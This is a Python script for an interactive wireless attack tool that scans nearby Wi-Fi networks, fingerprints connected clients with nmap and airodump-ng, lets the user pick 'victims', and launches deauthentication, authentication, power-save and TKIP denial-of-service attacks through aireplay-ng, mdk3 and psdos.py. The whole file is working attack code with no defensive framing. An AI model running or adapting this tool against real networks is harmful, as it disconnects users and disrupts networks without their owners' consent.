#!venv/bin/python

import subprocess
from prettytable import PrettyTable
from libnmap.parser import NmapParser
from collections import namedtuple
import os
import sys
import time


FILE_PREFIX = "results"
MAC_LENGTH  = 6  # The number of octets in a mac address

def sudo_user():
    return os.getuid() == 0

def clean_old_results():
    try:
        os.remove(FILE_PREFIX + ".xml")
    except FileNotFoundError:
        pass

    try:
        os.remove(FILE_PREFIX + "-01.csv")
    except FileNotFoundError:
        pass

def dump_network_info(Info):
    """
    Saves all output from nmap and airodump-ng scans to a file.
    nmap results: FILE_PREFIX.xml
    airodump results: FILE_PREFIX.csv
    """
    # Wifi interface
    interface = subprocess.check_output(["nmcli", "-t", "-f", "DEVICE", "connection","show", "--active"]).decode().strip()
    # SSID of network user is connected to
    print("Scanning for wireless networks...")
    # Sometimes this fails and says "command failed: Device or resource busy (-16)"
    sp1 = subprocess.Popen(["iw", "dev", interface, "link"], stdout=subprocess.PIPE)
    sp2 = subprocess.Popen(["grep", "SSID"], stdin=sp1.stdout, stdout=subprocess.PIPE)
    user_ssid = subprocess.check_output(["cut", "-f2-", "-d:"], stdin=sp2.stdout).decode().strip()
    # Create a dictionary of ssids and bssids -- {ssid : bssid}
    iw_scan1 = subprocess.Popen(["sudo", "iw", interface, "scan"], stdout=subprocess.PIPE)
    iw_scan2 = subprocess.Popen(["egrep", "^BSS|SSID:"], stdin=iw_scan1.stdout, stdout=subprocess.PIPE).communicate()[0].decode().strip().splitlines()
    ssid_dict = {}
    for bssid, ssid in zip(iw_scan2[0::2], iw_scan2[1::2]):
        ssid_dict[ssid.split(":", 1)[1].strip()] = bssid.split(" ", 1)[1][0:17]
    # Create enumerated table
    ssids_table = PrettyTable(["*","Option","SSID"])
    ssids_table.hrules=True
    option_num = 1
    for entry in ssid_dict:
        connected = ""
        if entry == user_ssid:
            connected += "*"
        ssids_table.add_row([connected, option_num, entry])
        option_num+=1
    print(ssids_table)
    print("* = You are connected to this network -- detailed results available\n")
    # TODO: Deal with bad input
    user_input = input("Choose an SSID to target: ")
    victim_network = ssids_table.get_string(border=False, header=False, fields=["SSID"], start=int(user_input)-1, end=int(user_input)).strip()

    if victim_network == user_ssid:
        print("You are connected to " + victim_network + ". Running nmap... ")
        # Get IPs
        sp = subprocess.Popen(["ip", "addr", "show", interface], stdout=subprocess.PIPE)
        ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:26]
        sp.wait()
        nmap = subprocess.call(["nmap", "--version-light", "-F", "-T4", "-n", "-sV", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Done.\n")
    else:
        print("You are not connected to " + victim_network + ".\n")

    # Airodump
    print("Enabling monitor mode... ")
    try:
        subprocess.check_output(["sudo", "airmon-ng", "start", interface])
        cmd = "ip link show | awk '/mon/ {print $2}'"
        ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
        mon_interface = ps.communicate()[0].decode()[:-2]
        print("Starting airodump for 10 seconds... ")
        airodump = subprocess.Popen(["sudo", "airodump-ng","--bssid", ssid_dict[victim_network], mon_interface, "-w", FILE_PREFIX, "-o", "csv"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # After 10 seconds, raise a TimeoutExpired exception to stop airodump
        o_airodump, unused_stderr = airodump.communicate(timeout=10)
    except subprocess.CalledProcessError as e:
        print ("Failed to enable monitor mode: " + e.output)
    except subprocess.TimeoutExpired:
        airodump.terminate()
        subprocess.check_output(["sudo", "airmon-ng", "stop", mon_interface])
        subprocess.call(["service", "network-manager", "start"])
        print("Done.\n")
        # Fixes invisible text in terminal & no echo after terminating airodump
        subprocess.call(["stty", "sane"])

    info = Info(interface, mon_interface, victim_network, ssid_dict[victim_network])
    return info

def create_target_table():
    """
    Creates a table of potential victims.
    Allows a user to choose a victim by number, or
    all victims by pressing "A"
    """

    Client   = namedtuple("Client", "mac, vendor, ip, power, services")
    Service  = namedtuple("Service", "port, state, service")
    clients  = dict()

    ap = parse_airodump(clients, Client)
    
    nmap_success = parse_nmap(clients, Client, Service, ap)

    # Create a sorted list of clients by ip first and then by power
    clients = sorted(clients.values(), key=lambda c: c.ip if c.ip is not None
                                                     else c.power)

    clients_table = gen_clients_table(clients, nmap_success)

    victims = handle_victims_choices(clients_table, clients)

    return victims

def parse_airodump(clients, Client):
    """
    Iterates through the airodump file, assuming that the first MAC address
    it encounters is the AP, and those following are clients.
    Modifies clients in-place and returns the AP.
    """
    try:
        with open(FILE_PREFIX + "-01.csv") as airodump_file:
            ap_seen = False  # The first MAC we see is the Access Point / Station
            for line in airodump_file:
                line = list(map(str.strip, line.split(",")))
                if len(line[0].split(":")) == MAC_LENGTH:
                    line.pop()  # Last entry is an empty string; discard it
                    if not ap_seen:
                        ap_seen = True
                        AP      = namedtuple("AP", "bssid, ssid")
                        bssid   = line[0]
                        ssid    = line[-1]
                        ap      = AP(bssid, ssid)
                    else:
                        # Construct a Client from the airodump information.
                        mac          = line[0]
                        power        = line[3]
                        clients[mac] = Client(mac, None, None, power, None)

        return ap

    except FileNotFoundError as e:
        sys.exit("No airodump results found - fatal exception: '{}'".format(e))

# Returns true if successful
def parse_nmap(clients, Client, Service, ap):
    """
    Iterates through the 'up' hosts in the nmap report, modifying the list of
    clients in-place to add the clients that are:
    a) Not the access point
    b) Not myself
    """
    try:
        nmap_report = NmapParser.parse_fromfile(FILE_PREFIX + ".xml")
    except Exception as e:
        nmap_report = None
        print("Skipping nmap results as NmapParser encountered exception: {}".format(type(e).__name__))
        return False

    if nmap_report is not None:
        for host in nmap_report.hosts:
            myself = (host.mac == "")
            if host.is_up() and not myself:
                if host.services:
                    services = list()
                    for service in host.services:
                        services.append(Service(service.port, service.state, service.service))
                else:
                    services = None

                try:  # Try: we already have this client from the airodump results.
                    client = clients[host.mac]
                    client = client._replace(vendor=host.vendor,ip=host.address,services=services)
                    clients[host.mac] = client
                except KeyError:  # Except: first time seeing this client so generate a new key,value pair
                    if host.mac != ap.bssid:
                        clients[host.mac] = Client(host.mac, host.vendor, host.address, None, services)
    return True

def gen_clients_table(clients, nmap_success):
    """
    Creates a PrettyTable from a clients list.
    """
    if nmap_success:
        clients_table = PrettyTable(["#", "MAC", "Wifi Card Vendor", "IP Address",
                                 "Power", "Services"], hrules=True)
    else:
        clients_table = PrettyTable(["#", "MAC", "Wifi Card Vendor", "Power"], hrules=True)

    services_table = None
    for i,c in enumerate(clients):
        if c.services:
            services_table = PrettyTable(["Port","State","Service"], border=False)
            for s in c.services:
                services_table.add_row([s.port, s.state, s.service])

        try:
            manuf = subprocess.check_output(["python", "manuf.py", c.mac]).decode().split("comment=u'")[1][:-3]
        except Exception as e:
            manuf = subprocess.check_output(["python", "manuf.py", c.mac]).decode().split("comment=")[1][:-2]

        if nmap_success:
            clients_table.add_row([i, c.mac, manuf, c.ip, c.power, services_table])
        else:
            clients_table.add_row([i, c.mac, manuf, c.power])

    return clients_table

def handle_victims_choices(clients_table, clients):
    """
    Returns a list of victims (a subset of the clients) when the user enters
    valid, comma-separted indices or enters 'A' to target all clients.
    Alternatively, the user can enter 'AP' to target the access point.
    """
    print("\n\n\n")
    print(clients_table)
    print("WARNING: A new terminal will be created for each victim chosen when executing attacks.")
    victims = []
    while not victims:
        user_input = input("Who would you like to attack? (Separate " + 
                           "indices by commas, enter 'A' for all, or 'AP'" + 
                           " to target the access point.) ").strip()
        if user_input.lower() == "a":
            victims = [client.mac for client in clients]
        elif user_input.lower() == "ap":
            return None
        else:
            try:
                victim_indices = list(map(str.strip, user_input.split(",")))
                victim_indices = map(int, victim_indices)
                for i in victim_indices:
                    victims.append(clients[i].mac)
            except Exception as e:
                victims = []
                print("Enter a comma-separated list of numbers or 'A' for all " +
                       "(exception: {})".format(e))
    return victims

def execute_hack(info, victims):
    """
    Takes in interface, BSSID, SSID, monitor interface names in order to attack the victim(s).
    Available attacks are: Authentication DoS, Deauthentication DoS, Power Save DoS, and TKIP DoS
    Tools used: mdk3, aireplay-ng, and psdos.py (courtesy of Core Security Technologies).
    """

    # Get channel
    try:
        with open(FILE_PREFIX + "-01.csv") as airodump_file:
            ap_seen = False  # The first MAC we see is the Access Point / Station
            for line in airodump_file:
                line = list(map(str.strip, line.split(",")))
                if len(line[0].split(":")) == MAC_LENGTH:
                    line.pop()  # Last entry is an empty string; discard it
                    if not ap_seen:
                        ap_seen = True
                        channel = line[3]
    except FileNotFoundError as e:
        sys.exit("No airodump results found - fatal exception: '{}'".format(e))

    # Set everything into monitor mode again on attack channel
    subprocess.call(["sudo", "airmon-ng", "start", info.interface, channel], stdout=subprocess.DEVNULL)
    subprocess.call(["sudo", "iwconfig", info.mon_interface, "channel", channel], stdout=subprocess.DEVNULL)

    print ("Which attack would you like to launch?\n")
    print ("\nSend the kill signal to end the program! Ctrl+C")

    # CHECK VICTIMS
    if victims:
        user_input = input("Enter A for AUTH DoS, D for DEAUTH DoS, P for POWER SAVE DoS, T for TKIP DoS: ").strip()
        if user_input.lower() == "d": # Deauth DoS
            for vic in victims:
                subprocess.call(["x-terminal-emulator","-e","sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", vic, "-e", info.ssid, info.mon_interface])
        elif user_input.lower() == "p": # Power Save
            for vic in victims:
                subprocess.call(["x-terminal-emulator","-e","sudo", "python", "psdos.py", info.mon_interface, vic, info.bssid, "nullfunction"])
        elif user_input.lower() == "a": # Authentication DoS
            subprocess.call(["sudo", "mdk3", info.mon_interface, "a", "-a", info.bssid])
        elif user_input.lower() == "t": # TKIP DoS
            subprocess.call(["sudo", "mdk3", info.mon_interface, "m", "-t", info.bssid])
    else:   # w/o Victims it is still admissable to launch an attack on the AP itself
        user_input = input("Enter A for AUTH DoS or T for TKIP DoS: ").strip()
        if user_input.lower() == "a": # Authentication DoS
            subprocess.call(["sudo", "mdk3", info.mon_interface, "a", "-a", info.bssid])
        elif user_input.lower() == "t": # TKIP DoS
            subprocess.call(["sudo", "mdk3", info.mon_interface, "m", "-t", info.bssid])

if __name__ == "__main__":
    if sudo_user():
        Info = namedtuple("Info", "interface mon_interface ssid bssid")

        clean_old_results()
        info = dump_network_info(Info)
        victims = create_target_table()
        execute_hack(info, victims)
    else:
        print("Script requires root access to perform network operations.")